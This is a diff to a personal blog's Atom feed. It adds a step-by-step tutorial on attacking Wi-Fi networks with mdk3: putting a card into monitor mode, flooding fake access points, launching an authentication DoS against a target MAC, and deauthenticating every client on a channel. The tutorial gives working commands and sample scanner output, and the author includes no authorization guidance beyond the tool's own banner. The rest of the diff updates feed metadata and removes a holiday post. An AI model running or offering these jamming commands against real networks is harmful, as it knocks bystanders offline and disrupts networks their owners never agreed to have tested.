@@ -1,8 +1,192 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-us"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://theodorecooper.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://theodorecooper.github.io/" rel="alternate" type="text/html" hreflang="en-us" /><updated>2021-11-06T18:17:56+08:00</updated><id>https://theodorecooper.github.io/feed.xml</id><title type="html">Theodore Cooper</title><subtitle>It's a freak geek's silly site.
-</subtitle><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><entry><title type="html">Is Telegram really anonymous &amp;amp; “focus on privacy” as it advertises? IM software comparison</title><link href="https://theodorecooper.github.io/others/pentest/2021-telegram/" rel="alternate" type="text/html" title="Is Telegram really anonymous &amp;amp; “focus on privacy” as it advertises? IM software comparison" /><published>2021-09-21T00:00:00+08:00</published><updated>2021-09-21T17:20:01+08:00</updated><id>https://theodorecooper.github.io/others/pentest/telegram</id><content type="html" xml:base="https://theodorecooper.github.io/others/pentest/2021-telegram/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-us"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://theodorecooper.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://theodorecooper.github.io/" rel="alternate" type="text/html" hreflang="en-us" /><updated>2021-11-20T21:31:35+08:00</updated><id>https://theodorecooper.github.io/feed.xml</id><title type="html">Theodore Cooper</title><subtitle>It's a freak geek's silly site.
+</subtitle><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><entry><title type="html">Perform jamming of Wi-Fi networks &amp;amp; Create fake APs with mdk3(DoS attack &amp;amp; Beacon Flooding)</title><link href="https://theodorecooper.github.io/linux/pentest/2021-mdk3/" rel="alternate" type="text/html" title="Perform jamming of Wi-Fi networks &amp;amp; Create fake APs with mdk3(DoS attack &amp;amp; Beacon Flooding)" /><published>2021-11-20T00:00:00+08:00</published><updated>2021-11-20T21:31:35+08:00</updated><id>https://theodorecooper.github.io/linux/pentest/mdk3</id><content type="html" xml:base="https://theodorecooper.github.io/linux/pentest/2021-mdk3/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
 
+&lt;p&gt;&lt;em&gt;mdk3&lt;/em&gt; is used for &lt;strong&gt;stress testing 802.11 networks(wifi)&lt;/strong&gt;. It consists of various methods by which we can perform tests. Some of  major method sare beacon flooding, deauthentication, WPA- dos etc…&lt;/p&gt;
+
+&lt;h2 id=&quot;mdk3-description&quot;&gt;mdk3 Description&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;MDK3 is a tool that “injects” data into wireless networks. “Injection” is the possibility to send self-made data through the air without being connected or associated to any network or station. MDK3 is used to send valid and invalid packets, which belong to the wireless management and not to regular data connections.&lt;/p&gt;
+
+&lt;p&gt;Homepage: https://github.com/charlesxsh/mdk3-master
+Author: ASPj of k2wrlz
+License: GPLv2&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;purpose&quot;&gt;Purpose&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;Sends beacon frames to show fake APs at clients. (&lt;strong&gt;&lt;em&gt;Beacon Flooding&lt;/em&gt;&lt;/strong&gt;)&lt;/li&gt;
+  &lt;li&gt;Sends authentication frames to all APs found in range. (&lt;strong&gt;&lt;em&gt;Authentication DoS&lt;/em&gt;&lt;/strong&gt;)&lt;/li&gt;
+  &lt;li&gt;Kicks everybody found from AP. (&lt;strong&gt;&lt;em&gt;Deauthentication / Disassociation Amok&lt;/em&gt;&lt;/strong&gt;)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;you-need&quot;&gt;You need…&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Linux based system.&lt;/li&gt;
+  &lt;li&gt;mdk3 installed&lt;/li&gt;
+  &lt;li&gt;Wireless card&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;install-mdk3&quot;&gt;Install mdk3&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;mdk3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If mdk3 is successfully installed, try to run it!&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[theodore@parrot]─[~]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;theodore: 
+
+MDK 3.0 v6 - &lt;span class=&quot;s2&quot;&gt;&quot;Yeah, well, whatever&quot;&lt;/span&gt;
+by ASPj of k2wrlz, using the osdep library from aircrack-ng
+And with lots of &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;from the great aircrack-ng community:
+Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
+telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
+THANK YOU!
+
+MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
+IMPORTANT: It is your responsibility to make sure you have permission from the
+network owner before running MDK against it.
+
+This code is licenced under the GPLv2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;check-the-wireless-card&quot;&gt;Check the wireless card&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; ifconfig
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For me, my card’s name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wlx48022a54bc53&lt;/code&gt;, in this article I will use the name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wlan0&lt;/code&gt; instead of this.&lt;/p&gt;
+
+&lt;h2 id=&quot;beacon-flooding&quot;&gt;Beacon Flooding&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Set the wireless card to &lt;strong&gt;Monitor Mode&lt;/strong&gt;:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; airmon-ng start wlan0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[theodore@parrot]─[~]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; airmon-ng start wlx48022a54bc53
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;theodore: 
+
+Found 2 processes that could cause trouble.
+Kill them using &lt;span class=&quot;s1&quot;&gt;'airmon-ng check kill'&lt;/span&gt; before putting
+the card &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;monitor mode, they will interfere by changing channels
+and sometimes putting the interface back &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;managed mode
+
+    PID Name
+    679 NetworkManager
+    693 wpa_supplicant
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlx48022a54bc53	rt2800usb	Ralink Technology, Corp. RT2870/RT3070
+Interface wlx48022a54bc53mon is too long &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linux so it will be renamed to the old style &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wlan#&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; name.
+
+		&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mac80211 monitor mode vif enabled on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;phy0]wlan0mon
+		&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mac80211 station mode vif disabled &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;phy0]wlx48022a54bc53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;(mac80211 monitor mode vif enabled on [phy0]&lt;strong&gt;&lt;em&gt;wlan0mon&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Create fake APs:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3 wlan0mon b &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; WIFI_NAME &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 6 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 80 	
+&lt;span class=&quot;c&quot;&gt;# after arg `-c` is the channel,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# `-s` sets the speed in packets per second (Default: 50)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/mdk3/fakeAP.jpeg&quot; alt=&quot;Fake AP&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ps1-mass-create-fake-aps&quot;&gt;P.S.1. Mass create fake APs&lt;/h3&gt;
+
+&lt;p&gt;Firstly, create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wifi_list.txt&lt;/code&gt; file, in the file stored all the AP’s names you want to create.&lt;/p&gt;
+
+&lt;p&gt;For example:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AP-0
+AP-1
+AP-2
+AP-3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, start mdk3 with this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3 wlan0mon b &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /path/to/wifi_list.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 6 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/mdk3/massFake.jpeg&quot; alt=&quot;Mass Created AP&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ps2-create-fake-aps-with-random-names&quot;&gt;P.S.2. Create fake APs with random names&lt;/h3&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3 wlan0mon b
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;authentication-dos&quot;&gt;Authentication DoS&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Sends authentication frames to all APs found in range.
+Too much clients freeze or reset some APs.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In some cases, the AP won’t freeze or reset, and even if it will not, it’s Internet speed will be very slow and hard to use.&lt;/p&gt;
+
+&lt;p&gt;See all AP nearby:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; airodump-ng wlan0mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CH  6 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 1 min &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2021-11-20 20:59 
+
+ BSSID              PWR  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSI&lt;/span&gt;
+
+ 48:0E:EC:A1:8D:3F   &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;        0        1    0   7   &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;   WPA              &amp;lt;len
+ 00:1F:7A:52:62:B1   &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;        0        0    0   6   &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;                    &amp;lt;len
+ 88:C3:97:F0:D0:4C  &lt;span class=&quot;nt&quot;&gt;-23&lt;/span&gt;       52        0    0   6  195   WPA2 CCMP   PSK  
+ 90:47:3C:06:7E:F0  &lt;span class=&quot;nt&quot;&gt;-37&lt;/span&gt;       34        0    0   5  130   WPA2 CCMP   PSK  
+ A8:C2:52:02:FC:A1  &lt;span class=&quot;nt&quot;&gt;-45&lt;/span&gt;       37        0    0   1  270   WPA2 CCMP   PSK  &amp;lt;len
+ A8:C2:52:02:FC:A0  &lt;span class=&quot;nt&quot;&gt;-45&lt;/span&gt;       29        3    0   1  270   WPA2 CCMP   PSK  
+ 7C:94:2A:88:CA:94  &lt;span class=&quot;nt&quot;&gt;-45&lt;/span&gt;       34        0    0   6  270   WPA2 CCMP   PSK  
+ A8:C2:52:02:FC:A5  &lt;span class=&quot;nt&quot;&gt;-45&lt;/span&gt;       27        0    0   1  270   WPA2 CCMP   PSK  &amp;lt;len
+ 7C:94:2A:88:CA:95  &lt;span class=&quot;nt&quot;&gt;-69&lt;/span&gt;       27        0    0   6  270   WPA2 CCMP   PSK  &amp;lt;len
+ 08:F4:58:D2:66:FD  &lt;span class=&quot;nt&quot;&gt;-51&lt;/span&gt;       26        0    0  11  360   WPA2 CCMP   PSK  &amp;lt;len
+ 08:F4:58:D2:66:F8  &lt;span class=&quot;nt&quot;&gt;-51&lt;/span&gt;       29        1    0  11  360   WPA2 CCMP   PSK  
+ 9C:A6:15:6D:BA:DB  &lt;span class=&quot;nt&quot;&gt;-50&lt;/span&gt;       22        0    0  11  405   WPA2 CCMP   PSK  
+ E4:BD:4B:AB:AD:08  &lt;span class=&quot;nt&quot;&gt;-53&lt;/span&gt;       38        0    0   4  130   WPA2 CCMP   PSK  
+ 08:F4:58:D2:66:F9  &lt;span class=&quot;nt&quot;&gt;-50&lt;/span&gt;       38        2    0  11  400   OPN              
+ 14:AD:CA:3A:21:5E  &lt;span class=&quot;nt&quot;&gt;-53&lt;/span&gt;       39        0    0   8  270   WPA2 CCMP   PSK  
+ E2:92:66:99:A8:0F  &lt;span class=&quot;nt&quot;&gt;-52&lt;/span&gt;        0        1    0   6  130   WPA2 CCMP   PSK  
+ 74:54:27:60:F0:1A  &lt;span class=&quot;nt&quot;&gt;-53&lt;/span&gt;       33        4    0   1  540   WPA2 CCMP   PSK  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Start attack.&lt;/p&gt;
+
+&lt;p&gt;Command:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3 wlan0mon a &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; TARGET_MAC_ADDRESS
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;deauthentication--disassociation-amok&quot;&gt;Deauthentication / Disassociation Amok&lt;/h2&gt;
+
+&lt;p&gt;From &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo airodump-ng wlan0mon&lt;/code&gt; we get a lot of information. Access points, mac IDs, clients, channel on which each AP broadcasts etc. Now we choose a channel to attack against.&lt;/p&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3 wlan0mon d &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 11 	&lt;span class=&quot;c&quot;&gt;#launch an attack against channel 11&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Linux" /><category term="Pentest" /><category term="Linux" /><category term="Pentest" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/mdk3/mdk3-cover.jpeg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/mdk3/mdk3-cover.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Is Telegram really anonymous &amp;amp; “focus on privacy” as it advertises? IM software comparison</title><link href="https://theodorecooper.github.io/others/pentest/2021-telegram/" rel="alternate" type="text/html" title="Is Telegram really anonymous &amp;amp; “focus on privacy” as it advertises? IM software comparison" /><published>2021-09-21T00:00:00+08:00</published><updated>2021-11-20T17:06:52+08:00</updated><id>https://theodorecooper.github.io/others/pentest/telegram</id><content type="html" xml:base="https://theodorecooper.github.io/others/pentest/2021-telegram/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;Now, more and more people wants to be &lt;strong&gt;anonymous&lt;/strong&gt;. The anonymity in everyday life enables people to be free to do many worthwhile things without feeling inhibited. Telegram, an IM known as &lt;em&gt;“focus on security and privacy”&lt;/em&gt;, is chosen. 
 But, does Telegram really &lt;em&gt;“focus on security and privacy”&lt;/em&gt; as it advertises? 
 Today, we’ll compare Telegram with other IM software. I’ll show you different softwares’ advantage and disadvantage, and help you decide which one to choose.&lt;/p&gt;
@@ -2010,28 +2194,4 @@ pkill run.sh
   &lt;li&gt;If installed applications crashes easily, please run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enable_houdini&lt;/code&gt; in terminal.&lt;/li&gt;
   &lt;li&gt;I recommend to use VMware, the VBox there’s something wrong!!!😡&lt;/li&gt;
   &lt;li&gt;Have fun!!!&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Linux" /><category term="Linux" /><summary type="html">​ So, finally, I remember to write an article about Android x86, This time I’ll tell all about Android x86.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/androidx86/androidx86.jpeg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/androidx86/androidx86.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Here’s to 2021!</title><link href="https://theodorecooper.github.io/other/2021-coming2021/" rel="alternate" type="text/html" title="Here’s to 2021!" /><published>2021-01-01T00:00:00+08:00</published><updated>2021-06-18T22:08:15+08:00</updated><id>https://theodorecooper.github.io/other/coming2021</id><content type="html" xml:base="https://theodorecooper.github.io/other/2021-coming2021/">&lt;h2 id=&quot;2021&quot;&gt;&lt;strong&gt;&lt;em&gt;2021&lt;/em&gt;&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;h2 id=&quot;wishing-you&quot;&gt;Wishing you&lt;/h2&gt;
-
-&lt;h2 id=&quot;peace-health-happiness&quot;&gt;Peace, health, happiness&lt;/h2&gt;
-
-&lt;h2 id=&quot;and-prosperity&quot;&gt;and prosperity&lt;/h2&gt;
-
-&lt;h2 id=&quot;in-coming-year&quot;&gt;in coming year&lt;/h2&gt;
-
-&lt;center&gt;┏━━┓┏━━┓┏━━┓┏━┓ &lt;/center&gt;
-
-&lt;center&gt;┗━┓┃┃┏┓┃┗━┓┃    ┃ ┃&lt;/center&gt;
-
-&lt;center&gt;┏━┛┃┃┃  ┃┃┏━┛┃    ┃ ┃&lt;/center&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;center&gt;Theodore Cooper&lt;/center&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;center&gt;┃┏━┛┃┃  ┃┃┃┏━┃    ┃ ┃&lt;/center&gt;
-
-&lt;center&gt;┃┗━┓┃┗┛┃ ┃┗━┓    ┃ ┃&lt;/center&gt;
-
-&lt;center&gt;┗━━┛┗━━┛ ┗━━┛┗━┛&lt;/center&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/coming2021/2021.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Other" /><category term="Other" /><summary type="html">2021</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/coming2021/2021.png" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/coming2021/2021.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;/ul&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Linux" /><category term="Linux" /><summary type="html">​ So, finally, I remember to write an article about Android x86, This time I’ll tell all about Android x86.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/androidx86/androidx86.jpeg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/androidx86/androidx86.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
